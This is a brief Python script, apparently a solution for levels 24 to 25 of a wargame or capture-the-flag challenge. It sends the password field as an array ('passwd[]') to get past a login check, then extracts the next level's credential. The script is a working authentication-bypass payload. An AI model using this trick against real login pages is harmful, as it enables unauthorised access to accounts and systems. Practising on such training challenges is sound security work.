import Auther
# Both works
# Auther.semicolonGetter(Auther.request(24,
#                                       params={'passwd[]':
#                                               "FOO"}).text,
#                        25)()
Auther.semicolonGetter(Auther.request(24, data={
    "passwd[]": ["FOO", "BAR"],
}).text, 25)()
